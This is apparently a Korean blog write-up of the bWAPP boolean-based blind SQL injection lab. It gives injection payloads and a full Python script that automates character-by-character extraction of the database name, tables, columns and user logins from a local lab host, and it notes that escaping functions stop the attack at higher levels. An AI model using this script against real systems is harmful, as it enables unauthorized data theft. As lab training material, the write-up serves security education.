---
layout: single
title: (bWAPP)SQL Injection - Blind - Boolean-Based (Python Code)
categories: bwapp
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/sqli-blind-boolean-archive/image.png)
- ‘(싱글쿼터) 입력시 Error 는 발생 하지만 DBMS Error 와 같이 특정 정보를 출력하지는 않는다.

![그림 1-2](/assets/image/bwapp/injection/sqli-blind-boolean-archive/image-1.png)
- 입력값을 참으로 만들면 “The movie exists in our database!” 라는 문자열을 반환한다.
![그림 1-3](/assets/image/bwapp/injection/sqli-blind-boolean-archive/image-2.png)
- 입력값을 반대로 거짓으로 만들면 “The movie does not exist in our database!” 라는 문자열을 반환한다.
- 이를 통해 입력값에 대한 참/거짓에 대한 반환값이 다르며, SQL Injection이 가능하다.
- 즉  Blind Based SQLI가 가능하다.


```sql
' or lengrh(database()) = 5#
```

![그림 1-4](/assets/image/bwapp/injection/sqli-blind-boolean-archive/image-3.png)
- 현재 DB는 Mysql 인 것을 알고 있으므로 database() 함수를 사용했다.
- 이를 모를 경우 각DBMS 에 맞는 함수 혹은 information.schema를 사용해야한다.

> 직접 입력창을 통해 하나씩 참/거짓 유무를 통해 알아내기에는 시간이 많이 소요되므로, 파이썬 코드를 통해 자동화 코드를 만들었다.

```python
import  requests, string

cookies={"PHPSESSID":"-----", "security_level":"0","BEEFHOOK":"------" }
def table_count():
    ch=''
    stringlist=string.ascii_letters+string.digits+string.punctuation
    for i in range(1,6):
        for j in stringlist:
            url = f"http://<ip>/bWAPP/sqli_4.php?title=' or substring(database(),{i},1) = '{j}'%23&action=search"
            res=requests.get(url, cookies=cookies)
            if "The movie exists in our database!" in res.text:
                ch+=j
                print(f"string..{ch}")
                break
if __name__ =="__main__":
    table_count()
```
![그림 1-5](/assets/image/bwapp/injection/sqli-blind-boolean-archive/image-4.png)
- Database 이름은 bwapp 로 확인되었다.

```python
def table_count():
    cnt=0
    while 1:
        cnt+=1
        url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or (select count(*) from information_schema.tables where table_schema='bwapp')={cnt}%23&action=search"
        res=requests.get(url,cookies=cookies)
        if "The movie exists in our database!" in res.text:
                print(cnt)
                break
        else:
            print(url)
```

![그림 1-6](/assets/image/bwapp/injection/sqli-blind-boolean-archive/image-5.png)
- bwapp 데이터베이스 내에 존재하는 테이블의 개수를 파악했다.
- 이러한 형태로 계속해서 코드를 작성해나갔다.

```python
import  requests, string

cookies={"PHPSESSID":"7610604104eefaf9c3b2bd6c624663b4", "security_level":"0","BEEFHOOK":"UhoQoFNoEivNNG7EheQSAIsf8yrWl2cCOaY1uXgrLizZDIE3F6QYDxbWZ3vLOnqtvLxBoUX7D3L6LmPP" }
def db_name():
    ch=''
    stringlist=string.ascii_letters+string.digits+string.punctuation
    for i in range(1,6):
        for j in stringlist:
            url = f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or substring(database(),{i},1) = '{j}'%23&action=search"
            res=requests.get(url, cookies=cookies)
            if "The movie exists in our database!" in res.text:
                ch+=j
                break
    print(f"MySQL 기준 현재 사용중인 DB명은{ch}입니다.")
def table_count():
    cnt=0
    while 1:
        cnt+=1
        url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or (select count(*) from information_schema.tables where table_schema='bwapp')={cnt}%23&action=search"
        res=requests.get(url,cookies=cookies)
        if "The movie exists in our database!" in res.text:
                print(f"현재 데이터베이스 내의 존재하는 테이블은{cnt}가지 입니다.")
                return cnt
                break
def table(table_count):
    len_arr=[]
    str_arr=[]
    ch=''
    stringlist=string.ascii_letters+string.digits+string.punctuation
    for i in range(table_count):
        length=1
        while 1:
            url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or length((select table_name from information_schema.tables where table_schema='bwapp' limit {i},1))={length}%23&action=search"
            res=requests.get(url,cookies=cookies)
            if "The movie exists in our database!" in res.text:
                len_arr.append(length)
                print(f'{i+1} 번째 테이블의 길이는{length}입니다.')
                print(len_arr)
                break
            else:
                length+=1
    while 1:
        a=0
        for i in len_arr:
            for j in range(1,i+1):
                for k in stringlist:
                    url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or substring((select table_name from information_schema.tables where table_schema='bwapp' limit {a},1),{j},1)='{k}'%23&action=search"
                    res=requests.get(url,cookies=cookies)
                    if "The movie exists in our database!" in res.text:
                        ch+=k
                        break
            str_arr.append(ch)
            ch=''
                    #print(url)
            a+=1
        break
    print(f"해당 데이터베이스에 존재하는 테이블들은{str_arr}입니다.")
def column_count():
    cnt=0
    while 1:
        cnt+=1
        url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or (select count(*) from information_schema.columns where table_schema='bwapp' and table_name='users')={cnt}%23&action=search"
        res=requests.get(url,cookies=cookies)
        if "The movie exists in our database!" in res.text:
                print(f"현재 선택하신 테이블 내의 존재하는 컬럼은{cnt}가지 입니다.")
                return cnt
                break
    
def column(column_count):
    len_arr=[]
    str_arr=[]
    ch=''
    stringlist=string.ascii_letters+string.digits+string.punctuation
    for i in range(column_count):
        length=1
        while 1:
            url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or length((select column_name from information_schema.columns where table_schema='bwapp' and table_name='users' limit {i},1))={length}%23&action=search"
            res=requests.get(url,cookies=cookies)
            if "The movie exists in our database!" in res.text:
                len_arr.append(length)
                print(f'{i+1} 번째 컬럼의 길이는{length}입니다.')
                print(len_arr)
                break
            else:
                length+=1
    while 1:
        a=0
        for i in len_arr:
            for j in range(1,i+1):
                for k in stringlist:
                    url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or substring((select column_name from information_schema.columns where table_schema='bwapp' and table_name='users' limit {a},1),{j},1)='{k}'%23&action=search"
                    res=requests.get(url,cookies=cookies)
                    if "The movie exists in our database!" in res.text:
                        ch+=k
                        break
            str_arr.append(ch)
            ch=''
                    #print(url)
            a+=1
        break
    print(f"해당 선택하신 테이블 내의 존재하는 컬럼들은{str_arr}입니다.")    
def data():
    cnt=0
    while 1:
        cnt+=1
        url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or (select count(id) from bWAPP.users)={cnt}%23&action=search"
        res=requests.get(url,cookies=cookies)
        if "The movie exists in our database!" in res.text:
            print(f"현재 테이블의 컬럼 내의 존재하는 데이터들은{cnt}가지 입니다.")
            break
    len_arr=[]
    str_arr=[]
    ch=''
    stringlist=string.ascii_letters+string.digits+string.punctuation
    for i in range(cnt):
        length=1
        while 1:
            url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or length((select login from bWAPP.users limit {i},1))={length}%23&action=search"
            res=requests.get(url,cookies=cookies)
            if "The movie exists in our database!" in res.text:
                len_arr.append(length)
                print(f'{i+1} 번째 데이터 길이는{len_arr}입니다.')
                print(len_arr)
                break
            else:
                length+=1
    while 1:
        a=0
        for i in len_arr:
            for j in range(1,i+1):
                for k in stringlist:
                    url=f"http://192.168.146.133/bWAPP/sqli_4.php?title=' or substring((select login from bWAPP.users limit {a},1),{j},1)='{k}'%23&action=search"
                    res=requests.get(url,cookies=cookies)
                    if "The movie exists in our database!" in res.text:
                        ch+=k
                        break
            str_arr.append(ch)
            ch=''
                    #print(url)
            a+=1
        break
    print(f"해당 선택하신 컬럼 내의 존재하는 데이터는{str_arr}입니다.")

if __name__ =="__main__":
    db_name()
    table_count=table_count()
    table(table_count)
    column_count=column_count()
    column(column_count)
    data()
```

![그림 1-7](/assets/image/bwapp/injection/sqli-blind-boolean-archive/image-6.png)
- 최종적으로 특정 커럼의 데이터를 한번에 추출할 수 있다.
-  아직은 각 결과들에 대해 쿼리문 내의 SELECT 절에 해당되는 값들을 결과 값에서 선택하여 하나씩 수정해야한다.
- 추 후 해당 부분도 한번에 뽑아 낼 수 있도록 자동화를 할 예정이다.


## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.

